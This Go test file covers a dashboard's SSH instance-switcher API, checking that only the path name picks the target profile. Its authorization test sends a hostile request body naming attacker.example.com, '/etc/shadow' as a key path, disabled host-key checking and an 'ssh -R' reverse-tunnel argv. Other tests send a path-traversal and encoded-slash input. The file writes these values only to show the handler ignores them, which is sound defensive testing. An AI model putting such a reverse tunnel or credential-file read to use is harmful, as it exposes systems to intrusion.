package dashboard

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"strings"
	"testing"

	"github.com/marmutapp/superbased-observer/internal/db"
)

// instanceLaunchManager is a fakeLaunchManager that ALSO satisfies the optional
// instanceManager seam, mirroring sshLaunchManager. Keeping it separate is the
// point of the optional-interface design: every existing fake that does NOT
// implement it must keep compiling and must degrade honestly.
type instanceLaunchManager struct {
	fakeLaunchManager
	enabled   bool
	instances []InstanceInfo
	// connectNames records every name that reached the manager, which is what
	// the name-only wire test asserts on.
	connectNames    []string
	disconnectNames []string
	testNames       []string
	connectErr      error
	disconnectErr   error
	testResult      InstanceTestResult
	testErr         error
}

func (m *instanceLaunchManager) Instances() (bool, []InstanceInfo) {
	return m.enabled, m.instances
}

func (m *instanceLaunchManager) ConnectInstance(name string) (InstanceInfo, error) {
	m.connectNames = append(m.connectNames, name)
	if m.connectErr != nil {
		return InstanceInfo{}, m.connectErr
	}
	return InstanceInfo{
		Name: name, Label: "Dev box", Target: "dev@devbox.internal",
		DashboardPort: 8081, State: "connected", LocalPort: 41234,
		URL: "http://127.0.0.1:41234",
	}, nil
}

func (m *instanceLaunchManager) DisconnectInstance(name string) (InstanceInfo, error) {
	m.disconnectNames = append(m.disconnectNames, name)
	if m.disconnectErr != nil {
		return InstanceInfo{}, m.disconnectErr
	}
	return InstanceInfo{Name: name, Label: "Dev box", DashboardPort: 8081, State: "disconnected"}, nil
}

func (m *instanceLaunchManager) TestInstance(name string) (InstanceTestResult, error) {
	m.testNames = append(m.testNames, name)
	if m.testErr != nil {
		return InstanceTestResult{}, m.testErr
	}
	return m.testResult, nil
}

func newInstanceManager() *instanceLaunchManager {
	return &instanceLaunchManager{
		enabled: true,
		instances: []InstanceInfo{
			{Name: "sb-devbox", Label: "Dev box", Target: "dev@devbox.internal", DashboardPort: 8081, State: "disconnected"},
		},
	}
}

// TestInstances_Listed pins the switcher payload.
func TestInstances_Listed(t *testing.T) {
	t.Parallel()
	s := newLaunchTestServer(t, newInstanceManager())
	rr := httptest.NewRecorder()
	s.Handler().ServeHTTP(rr, httptest.NewRequest(http.MethodGet, "/api/instances", nil))
	if rr.Code != 200 {
		t.Fatalf("GET /api/instances = %d: %s", rr.Code, rr.Body)
	}
	var resp instancesResponse
	if err := json.Unmarshal(rr.Body.Bytes(), &resp); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if !resp.Enabled || len(resp.Instances) != 1 {
		t.Fatalf("resp = %+v", resp)
	}
	if resp.Instances[0].Name != "sb-devbox" || resp.Instances[0].State != "disconnected" {
		t.Fatalf("row = %+v", resp.Instances[0])
	}
}

// TestInstances_UnwiredSeamIsFailSoft pins that a daemon without the seam
// answers 200/enabled:false, so the header omits the switcher instead of
// rendering an error. Profiles marshal as [] rather than null on both branches.
func TestInstances_UnwiredSeamIsFailSoft(t *testing.T) {
	t.Parallel()
	s := newLaunchTestServer(t, &fakeLaunchManager{}) // does NOT implement instanceManager
	rr := httptest.NewRecorder()
	s.Handler().ServeHTTP(rr, httptest.NewRequest(http.MethodGet, "/api/instances", nil))
	if rr.Code != 200 {
		t.Fatalf("GET /api/instances = %d: %s", rr.Code, rr.Body)
	}
	if !strings.Contains(rr.Body.String(), `"instances":[]`) {
		t.Fatalf("body %s must carry an empty array, never null", rr.Body)
	}
	var resp instancesResponse
	if err := json.Unmarshal(rr.Body.Bytes(), &resp); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if resp.Enabled {
		t.Fatal("an unwired seam reported enabled:true")
	}
	// The VERBS, by contrast, fail loudly rather than silently no-op.
	rr = httptest.NewRecorder()
	s.Handler().ServeHTTP(rr, httptest.NewRequest(http.MethodPost, "/api/instances/sb-devbox/connect", nil))
	if rr.Code != http.StatusNotImplemented {
		t.Fatalf("POST connect on an unwired daemon = %d, want 501", rr.Code)
	}
}

// TestInstanceConnect_NameOnlyWire is the load-bearing authorization test: the
// ONLY thing a request can influence is WHICH configured profile to reach.
//
// It asserts the property two ways. First, the name from the path reaches the
// manager verbatim. Second — the part that actually matters — a body stuffed
// with a host, a port, a key path and an ssh option changes NOTHING: the
// handler decodes no body at all, so there is no field for those to land in.
func TestInstanceConnect_NameOnlyWire(t *testing.T) {
	t.Parallel()
	mgr := newInstanceManager()
	s := newLaunchTestServer(t, mgr)

	hostile := `{"profile":"evil","host":"attacker.example.com","port":22,"dashboard_port":9999,` +
		`"local_port":1,"key_path":"/etc/shadow","options":["-o","StrictHostKeyChecking=no"],` +
		`"argv":["ssh","-R","0.0.0.0:22:127.0.0.1:22","attacker"]}`
	rr := httptest.NewRecorder()
	req := httptest.NewRequest(http.MethodPost, "/api/instances/sb-devbox/connect", strings.NewReader(hostile))
	req.Header.Set("Content-Type", "application/json")
	s.Handler().ServeHTTP(rr, req)
	if rr.Code != 200 {
		t.Fatalf("POST connect = %d: %s", rr.Code, rr.Body)
	}
	if len(mgr.connectNames) != 1 {
		t.Fatalf("manager saw %d connects, want 1", len(mgr.connectNames))
	}
	if got := mgr.connectNames[0]; got != "sb-devbox" {
		t.Fatalf("manager saw name %q, want the PATH name %q — a body field must never be able to redirect the destination", got, "sb-devbox")
	}

	var info InstanceInfo
	if err := json.Unmarshal(rr.Body.Bytes(), &info); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if info.LocalPort != 41234 || info.URL != "http://127.0.0.1:41234" {
		t.Fatalf("response = %+v, want the daemon-allocated loopback port and URL", info)
	}
	// The forwarded dashboard is reached on LOOPBACK, never on a routable
	// address the browser would send credentials to over the network.
	if !strings.HasPrefix(info.URL, "http://127.0.0.1:") {
		t.Fatalf("URL %q is not loopback", info.URL)
	}
}

// TestInstanceConnect_RefusesUnknownHostKey pins the known_hosts precondition
// end to end: with the checker reporting an untrusted host, the wire answers
// 409 and carries the honest fix, rather than a 500 or an opaque ssh string.
func TestInstanceConnect_RefusesUnknownHostKey(t *testing.T) {
	t.Parallel()
	mgr := newInstanceManager()
	mgr.connectErr = fmt.Errorf("%w: dev@devbox.internal is not in known_hosts. Open an SSH terminal to this profile once and accept the host key, then connect again",
		ErrInstanceHostKeyUnknown)
	s := newLaunchTestServer(t, mgr)

	rr := httptest.NewRecorder()
	s.Handler().ServeHTTP(rr, httptest.NewRequest(http.MethodPost, "/api/instances/sb-devbox/connect", nil))
	if rr.Code != http.StatusConflict {
		t.Fatalf("POST connect for an untrusted host = %d, want 409: %s", rr.Code, rr.Body)
	}
	body := rr.Body.String()
	if !strings.Contains(body, "known_hosts") {
		t.Fatalf("409 body %q must name the actual problem", body)
	}
	if !strings.Contains(body, "SSH terminal") {
		t.Fatalf("409 body %q must tell the operator how to fix it", body)
	}
}

// TestInstanceVerb_ErrorMapping pins each sentinel's status.
func TestInstanceVerb_ErrorMapping(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name string
		err  error
		want int
	}{
		{"disabled", ErrInstancesDisabled, http.StatusForbidden},
		{"unknown profile", fmt.Errorf("%w: %q", ErrInstanceUnknown, "nope"), http.StatusBadRequest},
		{"invalid profile", fmt.Errorf("%w: key gone", ErrInstanceInvalid), http.StatusBadRequest},
		{"host key", fmt.Errorf("%w: nope", ErrInstanceHostKeyUnknown), http.StatusConflict},
		{"forward failed", fmt.Errorf("%w: refused", ErrInstanceForwardFailed), http.StatusBadGateway},
		{"unclassified", fmt.Errorf("boom"), http.StatusInternalServerError},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			mgr := newInstanceManager()
			mgr.connectErr = tt.err
			s := newLaunchTestServer(t, mgr)
			rr := httptest.NewRecorder()
			s.Handler().ServeHTTP(rr, httptest.NewRequest(http.MethodPost, "/api/instances/sb-devbox/connect", nil))
			if rr.Code != tt.want {
				t.Fatalf("status = %d, want %d: %s", rr.Code, tt.want, rr.Body)
			}
		})
	}
}

// TestInstanceDisconnect pins the close verb.
func TestInstanceDisconnect(t *testing.T) {
	t.Parallel()
	mgr := newInstanceManager()
	s := newLaunchTestServer(t, mgr)
	rr := httptest.NewRecorder()
	s.Handler().ServeHTTP(rr, httptest.NewRequest(http.MethodPost, "/api/instances/sb-devbox/disconnect", nil))
	if rr.Code != 200 {
		t.Fatalf("POST disconnect = %d: %s", rr.Code, rr.Body)
	}
	if len(mgr.disconnectNames) != 1 || mgr.disconnectNames[0] != "sb-devbox" {
		t.Fatalf("manager saw disconnects %v", mgr.disconnectNames)
	}
	var info InstanceInfo
	if err := json.Unmarshal(rr.Body.Bytes(), &info); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if info.State != "disconnected" || info.URL != "" {
		t.Fatalf("response = %+v, want a disconnected row with no URL", info)
	}
}

// TestInstanceTest pins the probe verb: it reaches the manager with the
// PATH name (never a body field) and marshals the structured TestResult as-is.
func TestInstanceTest(t *testing.T) {
	t.Parallel()
	mgr := newInstanceManager()
	mgr.testResult = InstanceTestResult{
		KnownHostsChecked: true,
		KnownHostsOK:      true,
		AuthOK:            true,
		LatencyMS:         42,
	}
	s := newLaunchTestServer(t, mgr)

	hostile := `{"profile":"evil","host":"attacker.example.com"}`
	rr := httptest.NewRecorder()
	req := httptest.NewRequest(http.MethodPost, "/api/instances/sb-devbox/test", strings.NewReader(hostile))
	req.Header.Set("Content-Type", "application/json")
	s.Handler().ServeHTTP(rr, req)
	if rr.Code != 200 {
		t.Fatalf("POST test = %d: %s", rr.Code, rr.Body)
	}
	if len(mgr.testNames) != 1 || mgr.testNames[0] != "sb-devbox" {
		t.Fatalf("manager saw test names %v, want [sb-devbox] — a body field must never redirect the target", mgr.testNames)
	}
	var result InstanceTestResult
	if err := json.Unmarshal(rr.Body.Bytes(), &result); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if !result.KnownHostsOK || !result.AuthOK || result.LatencyMS != 42 {
		t.Fatalf("result = %+v", result)
	}
}

// TestInstanceTest_ErrorMapping pins the same sentinel-to-status mapping the
// connect verb uses, so a probe that could not even attempt (disabled,
// unknown profile, invalid profile) reports the honest status rather than a
// blanket 500.
func TestInstanceTest_ErrorMapping(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name string
		err  error
		want int
	}{
		{"disabled", ErrInstancesDisabled, http.StatusForbidden},
		{"unknown profile", fmt.Errorf("%w: %q", ErrInstanceUnknown, "nope"), http.StatusBadRequest},
		{"invalid profile", fmt.Errorf("%w: key gone", ErrInstanceInvalid), http.StatusBadRequest},
		{"unclassified", fmt.Errorf("boom"), http.StatusInternalServerError},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			mgr := newInstanceManager()
			mgr.testErr = tt.err
			s := newLaunchTestServer(t, mgr)
			rr := httptest.NewRecorder()
			s.Handler().ServeHTTP(rr, httptest.NewRequest(http.MethodPost, "/api/instances/sb-devbox/test", nil))
			if rr.Code != tt.want {
				t.Fatalf("status = %d, want %d: %s", rr.Code, tt.want, rr.Body)
			}
		})
	}
}

// TestInstanceVerb_BadPaths pins the path parser: only /{name}/{verb} with a
// known verb is routable, and a GET on a verb (or a POST on the list) is
// refused rather than silently doing something.
func TestInstanceVerb_BadPaths(t *testing.T) {
	t.Parallel()

	tests := []struct {
		method string
		path   string
		want   int
	}{
		{http.MethodPost, "/api/instances/sb-devbox/connect", 200},
		{http.MethodPost, "/api/instances/sb-devbox/test", 200},
		{http.MethodPost, "/api/instances/sb-devbox/reboot", http.StatusNotFound},
		{http.MethodPost, "/api/instances/sb-devbox", http.StatusNotFound},
		{http.MethodPost, "/api/instances/sb-devbox/connect/extra", http.StatusNotFound},
		// net/http's mux path-cleans a doubled slash before any handler runs, so
		// this never reaches parseInstancePath. Pinned at 301 so the behaviour is
		// recorded rather than mistaken for our own 404 — the empty-name case is
		// covered directly in TestParseInstancePath.
		{http.MethodPost, "/api/instances//connect", http.StatusMovedPermanently},
		{http.MethodPost, "/api/instances/sb-devbox/", http.StatusNotFound},
		{http.MethodGet, "/api/instances/sb-devbox/connect", http.StatusMethodNotAllowed},
		{http.MethodPost, "/api/instances", http.StatusMethodNotAllowed},
		{http.MethodDelete, "/api/instances/sb-devbox/connect", http.StatusMethodNotAllowed},
	}
	for _, tt := range tests {
		t.Run(tt.method+" "+tt.path, func(t *testing.T) {
			t.Parallel()
			s := newLaunchTestServer(t, newInstanceManager())
			rr := httptest.NewRecorder()
			s.Handler().ServeHTTP(rr, httptest.NewRequest(tt.method, tt.path, nil))
			if rr.Code != tt.want {
				t.Fatalf("status = %d, want %d: %s", rr.Code, tt.want, rr.Body)
			}
		})
	}
}

// TestInstanceFeatureGate pins the W5.1 org-governed gate on CONNECT, and its
// deliberate ABSENCE on disconnect.
//
// Connect is a sibling surface over the same [[terminal.ssh.profiles]] resource
// /api/terminal/ssh gates, and the 2026-08-25 review's P1 finding was exactly a
// family of such siblings that skipped the gate. Disconnect stays ungated for
// that same review's rule: an org that disabled a capability must never be able
// to stop a node from turning it OFF.
func TestInstanceFeatureGate(t *testing.T) {
	t.Parallel()

	newServerWithGate := func(t *testing.T, lm LaunchManager, gate func(bool) (bool, string)) *Server {
		t.Helper()
		tdir := t.TempDir()
		database, err := openTestDB(context.Background(), db.Options{Path: filepath.Join(tdir, "d.db")})
		if err != nil {
			t.Fatal(err)
		}
		t.Cleanup(func() { _ = database.Close() })
		s, err := New(Options{DB: database, LaunchManager: lm, TerminalFeatureGate: gate})
		if err != nil {
			t.Fatal(err)
		}
		return s
	}

	t.Run("nil gate fail-open", func(t *testing.T) {
		t.Parallel()
		s := newLaunchTestServer(t, newInstanceManager())
		rr := httptest.NewRecorder()
		s.Handler().ServeHTTP(rr, httptest.NewRequest(http.MethodPost, "/api/instances/sb-devbox/connect", nil))
		if rr.Code != 200 {
			t.Fatalf("status = %d, want 200: %s", rr.Code, rr.Body)
		}
	})

	t.Run("gate denies connect with its reason, and nothing is spawned", func(t *testing.T) {
		t.Parallel()
		mgr := newInstanceManager()
		s := newServerWithGate(t, mgr, func(bool) (bool, string) {
			return false, "terminals are disabled by your organization"
		})
		rr := httptest.NewRecorder()
		s.Handler().ServeHTTP(rr, httptest.NewRequest(http.MethodPost, "/api/instances/sb-devbox/connect", nil))
		if rr.Code != http.StatusForbidden {
			t.Fatalf("status = %d, want 403: %s", rr.Code, rr.Body)
		}
		if !strings.Contains(rr.Body.String(), "disabled by your organization") {
			t.Fatalf("403 body %q must carry the gate's reason verbatim", rr.Body)
		}
		if len(mgr.connectNames) != 0 {
			t.Fatalf("manager was reached despite a denying gate: %v", mgr.connectNames)
		}
	})

	t.Run("a denying gate never blocks disconnect", func(t *testing.T) {
		t.Parallel()
		mgr := newInstanceManager()
		s := newServerWithGate(t, mgr, func(bool) (bool, string) {
			return false, "terminals are disabled by your organization"
		})
		rr := httptest.NewRecorder()
		s.Handler().ServeHTTP(rr, httptest.NewRequest(http.MethodPost, "/api/instances/sb-devbox/disconnect", nil))
		if rr.Code != 200 {
			t.Fatalf("disconnect status = %d, want 200 — turning a capability OFF must never be org-blockable: %s", rr.Code, rr.Body)
		}
		if len(mgr.disconnectNames) != 1 {
			t.Fatalf("disconnect did not reach the manager: %v", mgr.disconnectNames)
		}
	})

	t.Run("a denying gate never blocks test", func(t *testing.T) {
		t.Parallel()
		mgr := newInstanceManager()
		s := newServerWithGate(t, mgr, func(bool) (bool, string) {
			return false, "terminals are disabled by your organization"
		})
		rr := httptest.NewRecorder()
		s.Handler().ServeHTTP(rr, httptest.NewRequest(http.MethodPost, "/api/instances/sb-devbox/test", nil))
		if rr.Code != 200 {
			t.Fatalf("test status = %d, want 200 (a read-only probe that opens no forward must not be org-blockable): %s", rr.Code, rr.Body)
		}
		if len(mgr.testNames) != 1 {
			t.Fatalf("test did not reach the manager: %v", mgr.testNames)
		}
	})
}

// TestInstanceRoutesAreLocalOnly pins the route CLASSIFICATION. Both patterns
// must be CapabilityLocal: GET discloses the operator's internal hostnames, and
// POST .../connect opens an `ssh -N -L` to a third-party machine whose forward
// then answers on THIS machine's loopback. Expressing that as route class rather
// than an in-handler check is what stops a future refactor silently dropping it.
func TestInstanceRoutesAreLocalOnly(t *testing.T) {
	t.Parallel()
	s := newLaunchTestServer(t, newInstanceManager())
	_, capMap, _ := s.registerRoutes(nil)
	for _, pattern := range []string{"/api/instances", "/api/instances/"} {
		got, ok := capMap[pattern]
		if !ok {
			t.Fatalf("%s is not in the route-capability registry", pattern)
		}
		if got != CapabilityLocal {
			t.Fatalf("%s capability = %v, want CapabilityLocal — a port forward into a third-party machine must not be remote-drivable", pattern, got)
		}
	}
	// Contrast pin: an ordinary read really is VIEW, so this asserts a genuine
	// difference rather than a tautology.
	if c, ok := capMap["/api/terminal/sessions"]; !ok || c != CapabilityView {
		t.Fatalf("/api/terminal/sessions capability = %v, want CapabilityView (the class this test contrasts against)", c)
	}
}

// TestParseInstancePath is the unit-level pin for the path split, including the
// decoding rule: a %2F or a traversal payload does not widen what is reachable
// because the decoded string is matched EXACTLY against the operator's profile
// list downstream.
func TestParseInstancePath(t *testing.T) {
	t.Parallel()

	tests := []struct {
		path     string
		wantName string
		wantVerb string
		wantOK   bool
	}{
		{"/api/instances/sb-devbox/connect", "sb-devbox", "connect", true},
		{"/api/instances/sb-devbox/disconnect", "sb-devbox", "disconnect", true},
		{"/api/instances/a%2Fb/connect", "a/b", "connect", true}, // decoded, then matched exactly (and so unresolvable)
		{"/api/instances/../etc/connect", "", "", false},         // three segments
		{"/api/instances/x", "", "", false},
		{"/api/instances/", "", "", false},
		{"/api/terminal/ssh", "", "", false},
	}
	for _, tt := range tests {
		name, verb, ok := parseInstancePath(tt.path)
		if ok != tt.wantOK || name != tt.wantName || verb != tt.wantVerb {
			t.Fatalf("parseInstancePath(%q) = (%q, %q, %v), want (%q, %q, %v)",
				tt.path, name, verb, ok, tt.wantName, tt.wantVerb, tt.wantOK)
		}
	}
}
